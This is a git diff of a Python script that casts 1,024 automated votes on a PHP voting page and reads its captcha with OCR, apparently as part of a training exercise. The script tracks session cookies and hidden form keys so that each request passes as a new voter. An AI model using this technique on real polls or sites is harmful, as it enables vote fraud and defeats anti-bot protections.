@@ -9,7 +9,7 @@ import requests
 import pytesseract
 import shutil
 
-def pull_captcha_image(cookie, url):
+def grab_captcha_text(cookie, url):
     captcha_res = requests.get(url, cookies=cookie, stream=True)
     if captcha_res.status_code == 200:
         try:
@@ -21,28 +21,23 @@ def pull_captcha_image(cookie, url):
         try:
             with open("captcha.png", "rb") as pic_file:
                 img = Image.open(pic_file)
-                return img
+                return pytesseract.image_to_string(img)
         except IOError:
             print("Couldn't open image")
-
-def extract_text(image):
-    return pytesseract.image_to_string(image)
-
-def grab_captcha_text(res, url):
-    image = pull_captcha_image(res, url)
-    image_text = extract_text(image)
-    return image_text
 
 def update_cookie_and_payload(res, cookie, payload, captcha=None):
     """
     Updates the cookie and payload as each vote gets cast
     """
+    print(res.text)
     tree = html.fromstring(res.text)
     key = str(tree.xpath('//input[@name="key"]/@value')[0])
     payload["key"] = key
     if captcha:
         payload["captcha"] = captcha
+    cookie["PHPSESSID"] = res.cookies["PHPSESSID"]
     cookie["HoldTheDoor"] = res.cookies["HoldTheDoor"]
+    print(cookie)
 
 def get_initial_data(url, cookie, payload):
     """
@@ -68,8 +63,6 @@ if __name__ == "__main__":
     hodor_payload = {
         "holdthedoor": "Submit",
         "id": "139",
-        "key": "1234",
-        "captcha": "ba23"
     }
     ENDPOINT = "http://158.69.76.135/level3.php"
     CAPTCHA_URL = "http://158.69.76.135/captcha.php"
@@ -79,4 +72,5 @@ if __name__ == "__main__":
     for i in range(1, 1025):
         res = cast_vote(ENDPOINT, hodor_cookies, hodor_payload)
         captcha = grab_captcha_text(hodor_cookies, CAPTCHA_URL)
-        update_cookie_and_payload(res, hodor_cookie, hodor_payload, captcha)
+        print(captcha)
+        update_cookie_and_payload(res, hodor_cookies, hodor_payload, captcha)
